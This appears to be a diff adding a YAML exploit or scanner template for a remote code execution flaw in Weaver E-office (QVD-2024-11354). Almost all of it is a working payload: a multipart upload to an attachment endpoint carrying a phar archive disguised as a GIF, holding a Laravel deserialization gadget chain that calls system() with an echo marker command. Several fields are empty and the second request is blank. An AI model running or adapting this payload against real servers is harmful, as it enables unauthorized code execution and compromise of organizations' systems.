@@ -1,0 +1,28 @@
+id:
+
+info:
+  name: 泛微E-office 远程代码执行漏洞(QVD-2024-11354)
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /eoffice10/server/public/api/attachment/atuh-file
+  headers:
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data; boundary=jzdwsbic
+  data: |
+    --jzdwsbic
+    Content-Disposition: form-data; name="Filedata"; filename="register.inc"
+    Content-Type: image/jpeg
+  
+    GIF89a<?php __HALT_COMPILER(); ?>
+    D.....................O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:".*.events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:".*.queueResolver";s:6:"system";}s:8:".*.event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";s:37:"echo 9yM86ESyFBXNDwCh6Nbsxy9wrcQrP25P";}}....test.txt....K..f.....~..........test.).i..f3....2pq....>....GBMB
+    --jzdwsbic--
+response1:
+  headers:
+  body: attachment_id
+  code:
+requests2:
+response2:
